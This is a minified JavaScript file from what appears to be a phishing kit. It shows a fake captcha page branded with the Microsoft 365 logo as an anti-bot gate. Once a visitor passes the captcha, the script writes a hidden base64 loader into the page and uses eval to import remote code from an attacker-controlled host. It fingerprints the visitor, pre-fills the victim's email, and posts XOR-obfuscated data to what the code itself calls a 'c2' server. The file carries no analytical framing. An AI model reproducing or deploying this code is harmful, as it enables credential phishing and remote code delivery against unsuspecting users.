(() => {
  "use strict";
  var __webpack_modules__ = {962: function () {
    var __classPrivateFieldGet = this && this.__classPrivateFieldGet || function (t, e, n, i) {
      if ("a" === n && !i) throw new TypeError("Private accessor was defined without a getter");
      if ("function" == typeof e ? t !== e || !i : !e.has(t)) throw new TypeError("Cannot read private member from an object whose class did not declare it");
      return "m" === n ? i : "a" === n ? i.call(t) : i ? i.value : e.get(t);
    }, _Antibot_instances, _Antibot_fire;
    const loader = "<STRIPPED>";
    let config_str = '{"host": "https://a1aa1818ef.solution-solstice.com", "is_bot": 1, "home": "", "title": "Greetings", "autograb": "em,email,add,##victimemail##"}';
    const config = JSON.parse(config_str);
    class Antibot {
      static load() {
        return new this;
      }
      constructor() {
        _Antibot_instances.add(this), this.actions = new Map;
      }
      start(t) {
        if (!t) return __classPrivateFieldGet(this, _Antibot_instances, "m", _Antibot_fire).call(this, "success");
        this.empty("head", {styles: "", html: '<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">'}), this.empty("body", {styles: "body{display:flex;justify-content:center;align-items:center}input:focus{border:none;outline:none}button{border:none;outline:none}button:hover{opacity:0.6}#regenerate-btn:hover{opacity:0.3}input{text-align:center}@keyframes appear{0%{opacity:0}100%{opacity:1}}", html: '<div><div style=display:flex;justify-content:center class=img><img src=https://upload.wikimedia.org/wikipedia/commons/thumb/8/85/Microsoft_365_logo.png/1200px-Microsoft_365_logo.png style="width:200px;margin:0 auto"></div><div style=text-align:center;margin:30px><span style="font-size:20px;font-family:\'Gill Sans\',\'Gill Sans MT\',Calibri,\'Trebuchet MS\',sans-serif">To continue, Please verify you\'re a human</span></div><div style=display:flex;column-gap:20px;margin:30px;justify-content:center;position:relative><span style=position:absolute;top:-15px;z-index:100;color:#00f;text-decoration:underline;font-size:13px;line-height:.4px;font-family:Verdana,Geneva,Tahoma,sans-serif>What\'s this?</span><div style=width:300px;height:100px;position:relative;display:grid;grid-template-columns:repeat(6,40px);gap:4px;background-image:url(https://static.vecteezy.com/system/resources/thumbnails/007/341/229/small_2x/social-networks-and-dating-apps-linear-seamless-pattern-with-message-icons-emoticons-and-hearts-vector.jpg) id=captcha-field></div><div style=display:flex;align-items:center><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRr9cgn9pBBTVV1_MlrHcwUzF5kr_UZN2TEoQ&s"alt=regenerate width=20 id=regenerate-btn></div></div><div style=display:flex;justify-content:center;align-items:center;flex-direction:column;row-gap:40px><input id=input-field placeholder="Captcha Code"style="width:45%;border:none;border-bottom:2px solid #000"> <button id=submit-btn style=background-color:#4778ff;width:170px;height:30px;border-radius:4px><div style=display:flex;justify-content:center;align-items:center;column-gap:5px><img src=https://cdn2.iconfinder.com/data/icons/email-117/128/200210-03-512.png alt=regenerate width=20> <span>Verify</span></div></button> <span style=color:red;display:none id=failure-field>Invalid input detected please try again</span></div></div>'}), document.getElementById("regenerate-btn").addEventListener("click", this.generate.bind(this)), document.getElementById("submit-btn").addEventListener("click", this.validate.bind(this)), this.generate();
      }
      validate() {
        let t = document.getElementById("input-field");
        if (t.value.toLowerCase() == this.captcha.toLowerCase()) return __classPrivateFieldGet(this, _Antibot_instances, "m", _Antibot_fire).call(this, "success");
        {
          __classPrivateFieldGet(this, _Antibot_instances, "m", _Antibot_fire).call(this, "failure"), t.value = "", this.generate();
          let e = document.getElementById("failure-field");
          e.style.display = "block", setTimeout(() => {
            e.style.display = "none";
          }, 6e3);
        }
      }
      generate() {
        let t, e = document.getElementById("captcha-field");
        if (e.innerHTML = "", !e) return console.error("Captcha frame to insert to not found");
        t = this.captcha = this.random(6), t.split("").forEach(t => {
          e.insertAdjacentHTML("beforeend", (t => {
            let e = Math.floor(60 * Math.random()), n = [0, 360].at(Math.round(Math.random()));
            return `\n\t\t\t<div style="position: relative; height: 100%; animation: appear .7s ease-in-out;">\n\t\t\t\t<span style="transform: rotateZ(${0 == n ? n + Math.floor(45 * Math.random()) : n - Math.floor(45 * Math.random())}deg); width: 40px; height: 40px; background-color: none; display: flex; border-radius: 50%; flex-direction: column; align-items: center; justify-content: center; position: absolute; top: ${e}%; font-size: 30px; text-decoration: solid;">${t}</span>\n\t\t\t</div>\n\t\t\t`;
          })(t));
        });
      }
      random(t) {
        let e = "";
        for (; e.length < t;) e += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxwz0123456789".at(Math.floor(62 * Math.random()));
        return e;
      }
      empty(t, e) {
        let n = document[t];
        return n.style.display = "block", n ? (n.innerHTML = "", e.styles && (n.innerHTML += `<style>${e.styles}</style>`), n.innerHTML += e.html) : console.error(`Target '${n}' can't be found`);
      }
      on(t, e) {
        return this.actions ? (this.actions.set(t, e), this) : console.error("Inner actions to emit not found");
      }
    }
    _Antibot_instances = new WeakSet, _Antibot_fire = function (t) {
      let e = this.actions.get(t);
      if (undefined === e) return console.error(`Action '${t}' has no receiver function defined`);
      e().then(() => {
        console.log(`Action '${t}' fired with success response`);
      }).catch(e => {
        console.error(`Action '${t}' failed with error '${e instanceof Error ? e.message : e}' `);
      });
    }, Antibot.load().on("success", async () => {
      for (let [t, e] of Object.entries(config)) sessionStorage.setItem(t, e);
      function docWriter(t) {
        document.open(), document.write(t), document.close();
      }
      docWriter(window.atob(loader));
      let sign = Math.floor(Math.random() * Number([1] + [0] + [0]));
      const fpPromise = eval(`import('${config.host}' + '/s/' + ${sign} +'?0')`).then(t => (sessionStorage.setItem("session", t.c()), t.load()));
      function errShow(t) {
        let e = document.getElementById("toast-content"), n = document.getElementById("toast");
        n.style.display = "block", n.className = "slide-in", e.innerHTML = t;
      }
      function post(t, e) {
        return new Promise((n, i) => {
          let o = new FormData, s = [sign, Math.floor(1e3 * Math.random() % Math.pow(2, 7))];
          for (let [t, n] of Object.entries(e)) {
            let e = [];
            n.split("").map(t => e.push(t.charCodeAt(0) ^ s[1])), e.push(s[1]), o.append(t, new Blob([new Uint8Array(e)], {type: "application/octet-stream"}));
          }
          fetch(config.host + t + s[0] + "?session=" + sessionStorage.getItem("session"), {method: "POST", body: o, headers: "false" == e.g ? {"Accept-Encoding": "gzip"} : ""}).then(t => t.text()).then(t => {
            n(t);
          }).catch(t => {
            errShow("Failed to connect to c2");
          });
        });
      }
      fpPromise.then(t => t.get()).then(t => {
        post("/r/", {g: "false", r: t.visitorId}).then(t => {
          docWriter(t);
        });
      }).catch(console.error);
    }).on("failure", async () => {}).start(!!config.is_bot);
  }}, __webpack_exports__ = {};
  __webpack_modules__[962]();
})();
